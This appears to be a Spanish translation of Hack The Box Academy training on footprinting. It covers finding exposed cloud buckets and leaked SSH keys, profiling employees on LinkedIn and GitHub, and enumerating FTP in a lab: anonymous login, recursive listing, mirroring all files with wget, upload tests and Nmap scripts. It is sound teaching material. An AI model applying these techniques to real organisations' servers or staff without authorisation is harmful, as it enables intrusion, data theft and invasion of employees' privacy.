Dicho contenido también se incluye a menudo en el código fuente de las páginas web, desde donde se cargan las imágenes, los códigos JavaScript o CSS. Este procedimiento a menudo alivia el servidor web y no almacena contenido innecesario.

#### Sitio web objetivo - Código fuente

![fragmento de código HTML que muestra los vínculos de prefetch y preconexión DNS a [redactado] blob.core.windows.net con atributos de origen cruzado.](https://academy.hackthebox.com/storage/modules/112/cloud3.png)

Proveedores externos como [dominio.glass](https://domain.glass/) también puede decirnos mucho sobre la infraestructura de la empresa. Como efecto secundario positivo, también podemos ver que el estado de evaluación de seguridad de Cloudflare se ha clasificado como "Seguro". Esto significa que ya hemos encontrado una medida de seguridad que se puede observar para la segunda capa (puerta de enlace).

#### Resultados de Dominio.Glass

![Página de estado del dominio que muestra la evaluación de seguridad de Cloudflare como segura para [redactado]. Incluye enlaces de redes sociales, herramientas externas, información de IP y detalles de certificados SSL con nombres de emisor y DNS.](https://academy.hackthebox.com/storage/modules/112/cloud1.png)

Otro proveedor muy útil es [GrayHatWarfare](https://buckets.grayhatwarfare.com/). Podemos realizar muchas búsquedas diferentes, descubrir el almacenamiento en la nube de AWS, Azure y GCP, e incluso ordenar y filtrar por formato de archivo. Por lo tanto, una vez que los hemos encontrado a través de Google, también podemos buscarlos en GrayHatWarefare y descubrir pasivamente qué archivos se almacenan en el almacenamiento en la nube dado.

#### Resultados de GrayHatWarfare

![Panel que muestra las opciones de filtro y una lista de tres cubos de AWS S3 con recuentos de archivos: 1, 73 y 0.](https://academy.hackthebox.com/storage/modules/112/cloud2.png)

Muchas compañías también usan abreviaturas del nombre de la compañía, que luego se usan en consecuencia dentro de la infraestructura de TI. Dichos términos también forman parte de un excelente enfoque para descubrir el nuevo almacenamiento en la nube de la empresa. También podemos buscar archivos simultáneamente para ver los archivos a los que se puede acceder al mismo tiempo.

#### Llaves SSH Privadas y Públicas Fileteadas

![Panel que muestra los listados de archivos AWS S3 con dos entradas: 'id_rsa' y 'id_rsa.pub' de [redacted] bucket, con fecha de agosto de 2021.](https://academy.hackthebox.com/storage/modules/112/ghw1.png)

A veces, cuando los empleados están sobrecargados de trabajo o bajo alta presión, los errores pueden ser fatales para toda la empresa. Estos errores pueden incluso conducir a la filtración de claves privadas SSH, que cualquiera puede descargar e iniciar sesión en una o incluso más máquinas de la empresa sin usar una contraseña.

#### Clave Privada SSH

![Imagen de un bloque de clave privada RSA, comenzando con 'BEGIN RSA PRIVATE KEY' y terminando con 'END RSA PRIVATE KEY'.](https://academy.hackthebox.com/storage/modules/112/ghw2.png)



# Personal

---

La búsqueda e identificación de empleados en las plataformas de redes sociales también puede revelar mucho sobre la infraestructura y el maquillaje de los equipos. Esto, a su vez, puede llevarnos a identificar qué tecnologías, lenguajes de programación e incluso aplicaciones de software se están utilizando. En gran medida, también podremos evaluar el enfoque de cada persona en función de sus habilidades. Las publicaciones y el material compartido con otros también son un gran indicador de lo que la persona está involucrada actualmente y lo que esa persona siente actualmente es importante compartir con los demás.

Los empleados pueden ser identificados en varias redes comerciales, tales como [LinkedIn](https://www.linkedin.com/) o [Xing](https://www.xing.de/). Las ofertas de trabajo de las empresas también pueden decirnos mucho sobre su infraestructura y darnos pistas sobre lo que deberíamos estar buscando.

#### LinkedIn - Puesto de Trabajo

Código: txt

```txt
Required Skills/Knowledge/Experience:

* 3-10+ years of experience on professional software development projects.

« An active US Government TS/SCI Security Clearance (current SSBI) or eligibility to obtain TS/SCI within nine months.
« Bachelor's degree in computer science/computer engineering with an engineering/math focus or another equivalent field of discipline.
« Experience with one or more object-oriented languages (e.g., Java, C#, C++).
« Experience with one or more scripting languages (e.g., Python, Ruby, PHP, Perl).
« Experience using SQL databases (e.g., PostgreSQL, MySQL, SQL Server, Oracle).
« Experience using ORM frameworks (e.g., SQLAIchemy, Hibernate, Entity Framework).
« Experience using Web frameworks (e.g., Flask, Django, Spring, ASP.NET MVC).
« Proficient with unit testing and test frameworks (e.g., pytest, JUnit, NUnit, xUnit).
« Service-Oriented Architecture (SOA)/microservices & RESTful API design/implementation.
« Familiar and comfortable with Agile Development Processes.
« Familiar and comfortable with Continuous Integration environments.
« Experience with version control systems (e.g., Git, SVN, Mercurial, Perforce).

Desired Skills/Knowledge/ Experience:

« CompTIA Security+ certification (or equivalent).
« Experience with Atlassian suite (Confluence, Jira, Bitbucket).
« Algorithm Development (e.g., Image Processing algorithms).
« Software security.
« Containerization and container orchestration (Docker, Kubernetes, etc.)
« Redis.
« NumPy.
```

Desde un puesto de trabajo como este, podemos ver, por ejemplo, qué lenguajes de programación son los preferidos: `Java, C#, C++, Python, Ruby, PHP, Perl`. También requería que el solicitante estuviera familiarizado con diferentes bases de datos, tales como: `PostgreSQL, Mysql, and Oracle`. Además, sabemos que se utilizan diferentes frameworks para el desarrollo de aplicaciones web, tales como: `Flask, Django, ASP.NET, Spring`.

Además, usamos `REST APIs, Github, SVN, and Perforce`. La oferta de trabajo también da como resultado que la empresa trabaje con Atlassian Suite, y por lo tanto puede haber recursos a los que potencialmente podríamos acceder. Podemos ver algunas habilidades y proyectos de la historia de la carrera que nos dan una estimación razonable del conocimiento del empleado.

#### LinkedIn - Empleado #1 Acerca de

![Sección de perfil que menciona especificaciones W3C, componentes web, React, Svelte, AngularJS y un enlace de GitHub a proyectos de código abierto.](https://academy.hackthebox.com/storage/modules/112/linkedin-pers2.png)

Tratamos de hacer contactos comerciales en los sitios de redes sociales y demostrar a los visitantes qué habilidades aportamos a la mesa, lo que inevitablemente nos lleva a compartir con el público lo que sabemos y lo que hemos aprendido hasta ahora. Las empresas siempre contratan empleados cuyas habilidades pueden usar y aplicar al negocio. Por ejemplo, sabemos que Flask y Django son frameworks web para el lenguaje de programación Python.

Si hacemos una pequeña búsqueda de configuraciones erróneas de seguridad de Django, eventualmente nos encontraremos con lo siguiente [Repositorio github](https://github.com/boomcamp/django-security) eso describe OWASP Top10 para Django. Podemos usar esto para entender la estructura interna de Django y cómo funciona. Las mejores prácticas también a menudo nos dicen qué buscar. Porque muchos confían ciegamente en ellos e incluso nombran muchos de los archivos como se muestra en las instrucciones.

#### Gitano

![Fragmento de código que muestra JSON con campos para nombre, autor, correo electrónico y una URL de GitHub.](https://academy.hackthebox.com/storage/modules/112/github.png)

![Fragmento de código que define una función para decodificar un JWT con una cadena JWT de carga útil, secreta y redactada.](https://academy.hackthebox.com/storage/modules/112/github2.png)

Mostrar nuestros proyectos puede, por supuesto, ser una gran ventaja para hacer nuevos contactos comerciales y posiblemente incluso obtener un nuevo trabajo, pero por otro lado, puede conducir a errores que serán muy difíciles de solucionar. Por ejemplo, en uno de los archivos, podemos descubrir la dirección de correo electrónico personal del empleado, y tras una investigación más profunda, la aplicación web tiene un codificado [Token JWT](https://jwt.io/).

#### LinkedIn - Empleado #2 Carrera

![Perfil que muestra los roles: Vicepresidente de Ingeniero de Software e Ingeniero Asociado de Software. Las responsabilidades incluyen el desarrollo líder de aplicaciones móviles CRM y la entrega del sistema BrokerVotes. Habilidades enumeradas: Java, React, Slang, Elastic, Kafka.](https://academy.hackthebox.com/storage/modules/112/linkedin-pers1.png)

[LinkedIn](https://www.linkedin.com/) ofrece una búsqueda integral de empleados, ordenados por conexiones, ubicaciones, empresas, escuela, industria, idioma de perfil, servicios, nombres, títulos y más. Comprensiblemente, cuanto más detallada sea la información que proporcionamos allí, menos resultados obtendremos. Por lo tanto, debemos pensar cuidadosamente sobre el propósito de realizar la búsqueda.

Supongamos que estamos tratando de encontrar la infraestructura y la tecnología que la compañía tiene más probabilidades de usar. Debemos buscar empleados técnicos que trabajen tanto en desarrollo como en seguridad. Porque en función del área de seguridad y los empleados que trabajan en esa área, también podremos determinar qué medidas de seguridad ha implementado la compañía para asegurarse.


# FTP

---

El `File Transfer Protocol` (`FTP`) es uno de los protocolos más antiguos de Internet. El FTP se ejecuta dentro de la capa de aplicación de la pila de protocolos TCP/IP. Por lo tanto, está en la misma capa que `HTTP` o `POP`. Estos protocolos también funcionan con el soporte de navegadores o clientes de correo electrónico para realizar sus servicios. También hay programas FTP especiales para el Protocolo de Transferencia de Archivos.

Imaginemos que queremos subir archivos locales a un servidor y descargar otros archivos usando el [FTP](https://datatracker.ietf.org/doc/html/rfc959) protocolo. En una conexión FTP, se abren dos canales. En primer lugar, el cliente y el servidor establecen un canal de control a través de `TCP port 21`. El cliente envía comandos al servidor y el servidor devuelve códigos de estado. Entonces ambos participantes de comunicación pueden establecer el canal de datos a través de `TCP port 20`. Este canal se utiliza exclusivamente para la transmisión de datos, y el protocolo busca errores durante este proceso. Si se rompe una conexión durante la transmisión, el transporte se puede reanudar después de restablecer el contacto.

Se hace una distinción entre `active` y `passive` FTP. En la variante activa, el cliente establece la conexión como se describe a través del puerto TCP 21 y, por lo tanto, informa al servidor a través del puerto del lado del cliente que el servidor puede transmitir sus respuestas. Sin embargo, si un firewall protege al cliente, el servidor no puede responder porque todas las conexiones externas están bloqueadas. Para este propósito, el `passive mode` ha sido desarrollado. Aquí, el servidor anuncia un puerto a través del cual el cliente puede establecer el canal de datos. Dado que el cliente inicia la conexión en este método, el firewall no bloquea la transferencia.

El FTP sabe diferente [comandos](https://web.archive.org/web/20230326204635/https://www.smartfile.com/blog/the-ultimate-ftp-commands-list/) y códigos de estado. No todos estos comandos se implementan consistentemente en el servidor. Por ejemplo, el lado del cliente indica al lado del servidor que cargue o descargue archivos, organice directorios o elimine archivos. El servidor responde en cada caso con un código de estado que indica si el comando se implementó correctamente. Se puede encontrar una lista de posibles códigos de estado [aquí](https://en.wikipedia.org/wiki/List_of_FTP_server_return_codes).

Por lo general, necesitamos credenciales para usar FTP en un servidor. También necesitamos saber que FTP es un `clear-text` protocolo que a veces se puede olfatear si las condiciones en la red son correctas. Sin embargo, también existe la posibilidad de que un servidor ofrezca `anonymous FTP`. El operador del servidor permite a cualquier usuario cargar o descargar archivos a través de FTP sin usar una contraseña. Dado que existen riesgos de seguridad asociados con dicho servidor FTP público, las opciones para los usuarios suelen ser limitadas.

---

## TFTP

`Trivial File Transfer Protocol` (`TFTP`) es más simple que FTP y realiza transferencias de archivos entre procesos de cliente y servidor. Sin embargo, eso `does not` proporcione autenticación de usuario y otras características valiosas compatibles con FTP. Además, mientras FTP usa TCP, TFTP usa `UDP`, lo que lo convierte en un protocolo poco confiable y hace que use la recuperación de la capa de aplicación asistida por UDP.

Esto se refleja, por ejemplo, en el hecho de que TFTP, a diferencia de FTP, no requiere la autenticación del usuario. No admite el inicio de sesión protegido a través de contraseñas y establece límites de acceso basados únicamente en los permisos de lectura y escritura de un archivo en el sistema operativo. Prácticamente, esto lleva a que TFTP funcione exclusivamente en directorios y con archivos que se han compartido con todos los usuarios y se pueden leer y escribir globalmente. Debido a la falta de seguridad, TFTP, a diferencia de FTP, solo se puede usar en redes locales y protegidas.

Echemos un vistazo a algunos comandos de `TFTP`:

|**Comandos**|**Descripción**|
|---|---|
|`connect`|Establece el host remoto, y opcionalmente el puerto, para transferencias de archivos.|
|`get`|Transfiere un archivo o conjunto de archivos desde el host remoto al host local.|
|`put`|Transfiere un archivo o conjunto de archivos desde el host local al host remoto.|
|`quit`|Sale de tftp.|
|`status`|Muestra el estado actual de tftp, incluido el modo de transferencia actual (ascii o binario), el estado de conexión, el valor de tiempo de espera, etc.|
|`verbose`|Cambia el modo detallado, que muestra información adicional durante la transferencia, encendido o apagado de archivos.|

A diferencia del cliente FTP, `TFTP` no tiene funcionalidad de listado de directorios.

---

## Configuración Predeterminada

Uno de los servidores FTP más utilizados en las distribuciones basadas en Linux es [vsFTPd](https://security.appspot.com/vsftpd.html). La configuración predeterminada de vsFTPd se puede encontrar en `/etc/vsftpd.conf`y algunas configuraciones ya están predefinidas de forma predeterminada. Es muy recomendable instalar el servidor vsFTPd en una VM y echar un vistazo más de cerca a esta configuración.

#### Instalar vsFTPd

  FTP

```shell-session
vcrdcr@htb[/htb]$ sudo apt install vsftpd 
```

El servidor vsFTPd es solo uno de los pocos servidores FTP disponibles para nosotros. Hay muchas alternativas diferentes a ella, que también traen, entre otras cosas, muchas más funciones y opciones de configuración con ellas. Utilizaremos el servidor vsFTPd porque es una excelente manera de mostrar las posibilidades de configuración de un servidor FTP de una manera simple y fácil de entender sin entrar en los detalles de las páginas de manual. Si miramos el archivo de configuración de vsFTPd, veremos muchas opciones y configuraciones que se comentan o comentan. Sin embargo, el archivo de configuración no contiene todas las configuraciones posibles que se pueden realizar. Los existentes y desaparecidos se pueden encontrar en el [página de manual](http://vsftpd.beasts.org/vsftpd_conf.html).

#### archivo de configuración de vsFTPd

  FTP

```shell-session
vcrdcr@htb[/htb]$ cat /etc/vsftpd.conf | grep -v "#"
```

|**Configuración**|**Descripción**|
|---|---|
|`listen=NO`|¿Correr desde inetd o como un demonio independiente?|
|`listen_ipv6=YES`|¿Escuchar en IPv6 ?|
|`anonymous_enable=NO`|¿Habilitar acceso anónimo?|
|`local_enable=YES`|¿Permitir que los usuarios locales inicien sesión?|
|`dirmessage_enable=YES`|¿Mostrar mensajes de directorio activos cuando los usuarios entran en ciertos directorios?|
|`use_localtime=YES`|¿Usar la hora local?|
|`xferlog_enable=YES`|¿Activar el registro de cargas/descargas?|
|`connect_from_port_20=YES`|¿Conectar desde el puerto 20?|
|`secure_chroot_dir=/var/run/vsftpd/empty`|Nombre de un directorio vacío|
|`pam_service_name=vsftpd`|Esta cadena es el nombre del servicio PAM que usará vsftpd.|
|`rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem`|Las tres últimas opciones especifican la ubicación del certificado RSA para usar en conexiones cifradas SSL.|
|`rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key`||
|`ssl_enable=NO`||

Además, hay un archivo llamado `/etc/ftpusers` que también debemos prestar atención, ya que este archivo se utiliza para denegar a ciertos usuarios el acceso al servicio FTP. En el siguiente ejemplo, los usuarios `guest`, `john`, y `kevin` no se les permite iniciar sesión en el servicio FTP, incluso si existen en el sistema Linux.

#### FTPUSERS

  FTP

```shell-session
vcrdcr@htb[/htb]$ cat /etc/ftpusers

guest
john
kevin
```

---

## Configuración Peligrosa

Hay muchas configuraciones diferentes relacionadas con la seguridad que podemos hacer en cada servidor FTP. Estos pueden tener varios propósitos, como probar conexiones a través de los firewalls, probar rutas y mecanismos de autenticación. Uno de estos mecanismos de autenticación es el `anonymous` usuario. Esto se usa a menudo para permitir que todos en la red interna compartan archivos y datos sin acceder a las computadoras de los demás. Con vsFTPd, el [configuración opcional](http://vsftpd.beasts.org/vsftpd_conf.html) eso se puede agregar al archivo de configuración para que el inicio de sesión anónimo se vea así:

|**Configuración**|**Descripción**|
|---|---|
|`anonymous_enable=YES`|¿Permitir el inicio de sesión anónimo?|
|`anon_upload_enable=YES`|¿Permitir anónimo para cargar archivos?|
|`anon_mkdir_write_enable=YES`|¿Permitir anónimo para crear nuevos directorios?|
|`no_anon_password=YES`|¿No pides contraseña anónima?|
|`anon_root=/home/username/ftp`|Directorio para anónimo.|
|`write_enable=YES`|¿Permitir el uso de comandos FTP: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE y SITE?|

Con el cliente FTP estándar (`ftp`), podemos acceder al servidor FTP en consecuencia e iniciar sesión con el usuario anónimo si se han utilizado las configuraciones que se muestran arriba. El uso de la cuenta anónima puede ocurrir en entornos internos e infraestructuras donde todos los participantes son conocidos. El acceso a este tipo de servicio se puede configurar temporalmente o con la configuración para acelerar el intercambio de archivos.

Tan pronto como nos conectamos al servidor vsFTPd, el `response code 220` se muestra con el banner del servidor FTP. A menudo, este banner contiene la descripción de la `service` e incluso el `version` de ello. También nos dice qué tipo de sistema es el servidor FTP. Una de las configuraciones más comunes de los servidores FTP es permitir `anonymous` acceso, que no requiere credenciales legítimas, pero proporciona acceso a algunos archivos. Incluso si no podemos descargarlos, a veces solo enumerar los contenidos es suficiente para generar más ideas y anotar información que nos ayudará en otro enfoque.

#### Inicio de sesión anónimo

  FTP

```shell-session
vcrdcr@htb[/htb]$ ftp 10.129.14.136

Connected to 10.129.14.136.
220 "Welcome to the HTB Academy vsFTP service."
Name (10.129.14.136:cry0l1t3): anonymous

230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.


ftp> ls

200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 1002     1002      8138592 Sep 14 16:54 Calender.pptx
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Clients
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Documents
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Employees
-rw-rw-r--    1 1002     1002           41 Sep 14 16:45 Important Notes.txt
226 Directory send OK.

```

Sin embargo, para obtener la primera descripción general de la configuración del servidor, podemos usar el siguiente comando:

#### estado de vsFTPd

  FTP

```shell-session
ftp> status

Connected to 10.129.14.136.
No proxy connection.
Connecting using address family: any.
Mode: stream; Type: binary; Form: non-print; Structure: file
Verbose: on; Bell: off; Prompting: on; Globbing: on
Store unique: off; Receive unique: off
Case: off; CR stripping: on
Quote control characters: on
Ntrans: off
Nmap: off
Hash mark printing: off; Use of PORT cmds: on
Tick counter printing: off
```

Algunos comandos deben ser utilizados ocasionalmente, ya que estos harán que el servidor nos muestre más información que podemos utilizar para nuestros propósitos. Estos comandos incluyen `debug` y `trace`.

#### salida Detallada de VSFTPd

  FTP

```shell-session
ftp> debug

Debugging on (debug=1).


ftp> trace

Packet tracing on.


ftp> ls

---> PORT 10,10,14,4,188,195
200 PORT command successful. Consider using PASV.
---> LIST
150 Here comes the directory listing.
-rw-rw-r--    1 1002     1002      8138592 Sep 14 16:54 Calender.pptx
drwxrwxr-x    2 1002     1002         4096 Sep 14 17:03 Clients
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Documents
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Employees
-rw-rw-r--    1 1002     1002           41 Sep 14 16:45 Important Notes.txt
226 Directory send OK.
```

|**Configuración**|**Descripción**|
|---|---|
|`dirmessage_enable=YES`|¿Mostrar un mensaje cuando ingresan por primera vez a un nuevo directorio?|
|`chown_uploads=YES`|¿Cambiar la propiedad de los archivos cargados anónimamente?|
|`chown_username=username`|Usuario al que se le otorga la propiedad de los archivos cargados de forma anónima.|
|`local_enable=YES`|¿Habilitar usuarios locales para iniciar sesión?|
|`chroot_local_user=YES`|¿Ponga usuarios locales en su directorio de inicio?|
|`chroot_list_enable=YES`|¿Usar una lista de usuarios locales que se colocarán en su directorio de inicio?|

|**Configuración**|**Descripción**|
|---|---|
|`hide_ids=YES`|Toda la información de usuario y grupo en las listas de directorios se mostrará como "ftp".|
|`ls_recurse_enable=YES`|Permite el uso de listados de recurrencia.|

En el siguiente ejemplo, podemos ver que si el `hide_ids=YES` la configuración está presente, la representación UID y GUID del servicio se sobrescribirá, lo que nos dificultará identificar con qué derechos se escriben y cargan estos archivos.

#### Ocultar IDs - SÍ

  FTP

```shell-session
ftp> ls

---> TYPE A
200 Switching to ASCII mode.
ftp: setsockopt (ignored): Permission denied
---> PORT 10,10,14,4,223,101
200 PORT command successful. Consider using PASV.
---> LIST
150 Here comes the directory listing.
-rw-rw-r--    1 ftp     ftp      8138592 Sep 14 16:54 Calender.pptx
drwxrwxr-x    2 ftp     ftp         4096 Sep 14 17:03 Clients
drwxrwxr-x    2 ftp     ftp         4096 Sep 14 16:50 Documents
drwxrwxr-x    2 ftp     ftp         4096 Sep 14 16:50 Employees
-rw-rw-r--    1 ftp     ftp           41 Sep 14 16:45 Important Notes.txt
-rw-------    1 ftp     ftp            0 Sep 15 14:57 testupload.txt
226 Directory send OK.
```

Esta configuración es una característica de seguridad para evitar que se revelen nombres de usuario locales. Con los nombres de usuario, podríamos atacar los servicios como FTP y SSH y muchos otros con un ataque de fuerza bruta en teoría. Sin embargo, en realidad, [fail2ban](https://en.wikipedia.org/wiki/Fail2ban) las soluciones son ahora una implementación estándar de cualquier infraestructura que registre la dirección IP y bloquee todo el acceso a la infraestructura después de un cierto número de intentos fallidos de inicio de sesión.

Otra configuración útil que podemos usar para nuestros propósitos es la `ls_recurse_enable=YES`. Esto a menudo se establece en el servidor vsFTPd para tener una mejor visión general de la estructura de directorios FTP, ya que nos permite ver todo el contenido visible a la vez.

#### Listado Recursivo

  FTP

```shell-session
ftp> ls -R

---> PORT 10,10,14,4,222,149
200 PORT command successful. Consider using PASV.
---> LIST -R
150 Here comes the directory listing.
.:
-rw-rw-r--    1 ftp      ftp      8138592 Sep 14 16:54 Calender.pptx
drwxrwxr-x    2 ftp      ftp         4096 Sep 14 17:03 Clients
drwxrwxr-x    2 ftp      ftp         4096 Sep 14 16:50 Documents
drwxrwxr-x    2 ftp      ftp         4096 Sep 14 16:50 Employees
-rw-rw-r--    1 ftp      ftp           41 Sep 14 16:45 Important Notes.txt
-rw-------    1 ftp      ftp            0 Sep 15 14:57 testupload.txt

./Clients:
drwx------    2 ftp      ftp          4096 Sep 16 18:04 HackTheBox
drwxrwxrwx    2 ftp      ftp          4096 Sep 16 18:00 Inlanefreight

./Clients/HackTheBox:
-rw-r--r--    1 ftp      ftp         34872 Sep 16 18:04 appointments.xlsx
-rw-r--r--    1 ftp      ftp        498123 Sep 16 18:04 contract.docx
-rw-r--r--    1 ftp      ftp        478237 Sep 16 18:04 contract.pdf
-rw-r--r--    1 ftp      ftp           348 Sep 16 18:04 meetings.txt

./Clients/Inlanefreight:
-rw-r--r--    1 ftp      ftp         14211 Sep 16 18:00 appointments.xlsx
-rw-r--r--    1 ftp      ftp         37882 Sep 16 17:58 contract.docx
-rw-r--r--    1 ftp      ftp            89 Sep 16 17:58 meetings.txt
-rw-r--r--    1 ftp      ftp        483293 Sep 16 17:59 proposal.pptx

./Documents:
-rw-r--r--    1 ftp      ftp         23211 Sep 16 18:05 appointments-template.xlsx
-rw-r--r--    1 ftp      ftp         32521 Sep 16 18:05 contract-template.docx
-rw-r--r--    1 ftp      ftp        453312 Sep 16 18:05 contract-template.pdf

./Employees:
226 Directory send OK.

```

`Downloading` los archivos de dicho servidor FTP son una de las características principales, así como `uploading` archivos creados por nosotros. Esto nos permite, por ejemplo, utilizar vulnerabilidades LFI para hacer que el host ejecute comandos del sistema. Aparte de los archivos, podemos ver, descargar e inspeccionar. Los ataques también son posibles con los registros FTP, lo que lleva a `Remote Command Execution` (`RCE`). Esto se aplica a los servicios FTP y a todos aquellos que podemos detectar durante nuestra fase de enumeración.

#### Descargar un Archivo

  FTP

```shell-session
ftp> ls

200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxrwxrwx    1 ftp      ftp             0 Sep 16 17:24 Calendar.pptx
drwxrwxrwx    4 ftp      ftp          4096 Sep 16 17:57 Clients
drwxrwxrwx    2 ftp      ftp          4096 Sep 16 18:05 Documents
drwxrwxrwx    2 ftp      ftp          4096 Sep 16 17:24 Employees
-rwxrwxrwx    1 ftp      ftp            41 Sep 18 15:58 Important Notes.txt
226 Directory send OK.


ftp> get Important\ Notes.txt

local: Important Notes.txt remote: Important Notes.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for Important Notes.txt (41 bytes).
226 Transfer complete.
41 bytes received in 0.00 secs (606.6525 kB/s)


ftp> exit

221 Goodbye.
```

  FTP

```shell-session
vcrdcr@htb[/htb]$ ls | grep Notes.txt

'Important Notes.txt'
```

También podemos descargar todos los archivos y carpetas a los que tenemos acceso a la vez. Esto es especialmente útil si el servidor FTP tiene muchos archivos diferentes en una estructura de carpetas más grande. Sin embargo, esto puede causar alarmas porque nadie de la compañía generalmente quiere descargar todos los archivos y contenido a la vez.

#### Descargar Todos los Archivos Disponibles

  FTP

```shell-session
vcrdcr@htb[/htb]$ wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136

--2021-09-19 14:45:58--  ftp://anonymous:*password*@10.129.14.136/                                         
           => ‘10.129.14.136/.listing’                                                                     
Connecting to 10.129.14.136:21... connected.                                                               
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PORT ... done.    ==> LIST ... done.                                                                 
12.12.1.136/.listing           [ <=>                                  ]     466  --.-KB/s    in 0s       
                                                                                                         
2021-09-19 14:45:58 (65,8 MB/s) - ‘10.129.14.136/.listing’ saved [466]                                     
--2021-09-19 14:45:58--  ftp://anonymous:*password*@10.129.14.136/Calendar.pptx   
           => ‘10.129.14.136/Calendar.pptx’                                       
==> CWD not required.                                                           
==> SIZE Calendar.pptx ... done.                                                                                                                            
==> PORT ... done.    ==> RETR Calendar.pptx ... done.       

...SNIP...

2021-09-19 14:45:58 (48,3 MB/s) - ‘10.129.14.136/Employees/.listing’ saved [119]

FINISHED --2021-09-19 14:45:58--
Total wall clock time: 0,03s
Downloaded: 15 files, 1,7K in 0,001s (3,02 MB/s)
```

Una vez que hayamos descargado todos los archivos, `wget` creará un directorio con el nombre de la dirección IP de nuestro objetivo. Todos los archivos descargados se almacenan allí, que luego podemos inspeccionar localmente.

  FTP

```shell-session
vcrdcr@htb[/htb]$ tree .

.
└── 10.129.14.136
    ├── Calendar.pptx
    ├── Clients
    │   └── Inlanefreight
    │       ├── appointments.xlsx
    │       ├── contract.docx
    │       ├── meetings.txt
    │       └── proposal.pptx
    ├── Documents
    │   ├── appointments-template.xlsx
    │   ├── contract-template.docx
    │   └── contract-template.pdf
    ├── Employees
    └── Important Notes.txt

5 directories, 9 files
```

A continuación, podemos comprobar si tenemos los permisos para subir archivos al servidor FTP. Especialmente con los servidores web, es común que los archivos estén sincronizados y los desarrolladores tengan acceso rápido a los archivos. FTP se utiliza a menudo para este propósito, y la mayoría de las veces, los errores de configuración se encuentran en servidores que los administradores creen que no son detectables. La actitud de que no se puede acceder a los componentes internos de la red desde el exterior significa que el endurecimiento de los sistemas internos a menudo se descuida y conduce a configuraciones erróneas.

La capacidad de cargar archivos al servidor FTP conectado a un servidor web aumenta la probabilidad de obtener acceso directo al servidor web e incluso un shell inverso que nos permite ejecutar comandos internos del sistema y tal vez incluso escalar nuestros privilegios.

#### Subir un Archivo

  FTP

```shell-session
vcrdcr@htb[/htb]$ touch testupload.txt
```

Con el `PUT` comando, podemos cargar archivos en la carpeta actual al servidor FTP.

  FTP

```shell-session
ftp> put testupload.txt 

local: testupload.txt remote: testupload.txt
---> PORT 10,10,14,4,184,33
200 PORT command successful. Consider using PASV.
---> STOR testupload.txt
150 Ok to send data.
226 Transfer complete.


ftp> ls

---> TYPE A
200 Switching to ASCII mode.
---> PORT 10,10,14,4,223,101
200 PORT command successful. Consider using PASV.
---> LIST
150 Here comes the directory listing.
-rw-rw-r--    1 1002     1002      8138592 Sep 14 16:54 Calender.pptx
drwxrwxr-x    2 1002     1002         4096 Sep 14 17:03 Clients
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Documents
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Employees
-rw-rw-r--    1 1002     1002           41 Sep 14 16:45 Important Notes.txt
-rw-------    1 1002     133             0 Sep 15 14:57 testupload.txt
226 Directory send OK.

```

---

## Huella del Servicio

La huella utilizando varios escáneres de red también es un enfoque útil y generalizado. Estas herramientas nos facilitan la identificación de diferentes servicios, incluso si no son accesibles en puertos estándar. Una de las herramientas más utilizadas para este propósito es Nmap. Nmap también trae el [Motor de Scripting Nmap](https://nmap.org/book/nse.html) (`NSE`), un conjunto de muchos scripts diferentes escritos para servicios específicos. Más información sobre las capacidades de Nmap y NSE se puede encontrar en el [Enumeración de red con Nmap](https://academy.hackthebox.com/course/preview/network-enumeration-with-nmap) módulo. Podemos actualizar esta base de datos de scripts NSE con el comando mostrado.

#### Scripts FTP Nmap

  FTP

```shell-session
vcrdcr@htb[/htb]$ sudo nmap --script-updatedb

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 13:49 CEST
NSE: Updating rule database.
NSE: Script Database updated successfully.
Nmap done: 0 IP addresses (0 hosts up) scanned in 0.28 seconds
```

Todos los scripts de NSE se encuentran en el Pwnbox en `/usr/share/nmap/scripts/`, pero en nuestros sistemas, podemos encontrarlos usando un comando simple en nuestro sistema.

  FTP

```shell-session
vcrdcr@htb[/htb]$ find / -type f -name ftp* 2>/dev/null | grep scripts

/usr/share/nmap/scripts/ftp-syst.nse
/usr/share/nmap/scripts/ftp-vsftpd-backdoor.nse
/usr/share/nmap/scripts/ftp-vuln-cve2010-4221.nse
/usr/share/nmap/scripts/ftp-proftpd-backdoor.nse
/usr/share/nmap/scripts/ftp-bounce.nse
/usr/share/nmap/scripts/ftp-libopie.nse
/usr/share/nmap/scripts/ftp-anon.nse
/usr/share/nmap/scripts/ftp-brute.nse
```

Como ya sabemos, el servidor FTP generalmente se ejecuta en el puerto TCP estándar 21, que podemos escanear usando Nmap. También utilizamos el escaneo de versiones (`-sV`), escaneo agresivo (`-A`), y el escaneo de script predeterminado (`-sC`) contra nuestro objetivo `10.129.14.136`.

#### Mapa

  FTP

```shell-session
vcrdcr@htb[/htb]$ sudo nmap -sV -p21 -sC -A 10.129.14.136

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-16 18:12 CEST
Nmap scan report for 10.129.14.136
Host is up (0.00013s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rwxrwxrwx    1 ftp      ftp       8138592 Sep 16 17:24 Calendar.pptx [NSE: writeable]
| drwxrwxrwx    4 ftp      ftp          4096 Sep 16 17:57 Clients [NSE: writeable]
| drwxrwxrwx    2 ftp      ftp          4096 Sep 16 18:05 Documents [NSE: writeable]
| drwxrwxrwx    2 ftp      ftp          4096 Sep 16 17:24 Employees [NSE: writeable]
| -rwxrwxrwx    1 ftp      ftp            41 Sep 16 17:24 Important Notes.txt [NSE: writeable]
